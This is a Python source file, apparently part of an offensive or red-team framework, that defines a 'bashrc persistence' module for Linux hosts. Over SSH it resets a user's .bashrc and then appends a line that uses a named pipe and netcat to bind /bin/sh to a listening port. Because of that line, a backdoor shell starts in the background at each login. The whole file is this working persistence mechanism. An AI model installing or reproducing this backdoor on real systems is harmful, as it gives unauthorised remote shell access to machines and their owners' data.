import logging

from polarity_server.persistence.base import BasePersistence
from polarity_server.shell_deployment import SSHShell


class BashRcPersistence(BasePersistence):

    OS_FAMILY = ["Linux"]
    PORT = 22

    def install(self):
        if self._host.os_info.os_family in self.OS_FAMILY:
            ssh_shell = SSHShell(self._host, self._user)
            if not ssh_shell.create_connection():
                return False

            command = "cp -f /etc/skel/.bashrc /home/{}/.bashrc".format(self._user.username)
            ssh_shell.send_command(command)

            command = "echo \"NC=\`which nc\` && mknod /tmp/backpipe p 2>/dev/null; " \
                      "/bin/sh 0</tmp/backpipe | \$NC -lp {} 1>/tmp/backpipe 2>/dev/null &disown\" " \
                      ">> /home/{}/.bashrc".format(self._listen_port, self._user.username)
            ssh_shell.send_command(command)

            ssh_shell.close_connection()

            logging.info("Installed bashrc persistence on {}@{}"
                         .format(self._user.username, self._host.ip_address))

            return True
        else:
            return False
